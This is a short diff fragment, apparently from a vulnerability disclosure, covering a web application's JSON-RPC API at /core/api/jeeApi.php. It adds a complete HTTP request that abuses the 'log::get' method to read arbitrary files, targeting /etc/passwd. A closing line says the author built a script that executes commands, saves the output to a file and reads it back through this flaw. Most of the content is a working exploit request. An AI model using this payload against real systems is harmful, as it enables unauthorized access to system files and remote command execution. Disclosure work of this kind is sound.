@@ -56,5 +56,31 @@ Content-Length: 188
  }
 }
 
+Also there's an arbitrary read file thanks to the log::get method
 
 
+
+GET /core/api/jeeApi.php HTTP/1.1
+Host: xxx
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://xxx/index.php?v=d
+Cookie: PHPSESSID=xxx
+Content-Length: 171
+
+{
+ "jsonrpc":"2.0",
+ "method":"log::get",
+ "params":{
+"log":"/etc/passwd",
+"start":"",
+"nbLine":100,
+ "api":0,
+ "proapi":0
+ }
+}
+
+So i made a script that execute command, send the results in a file then read the file for output and voilà..
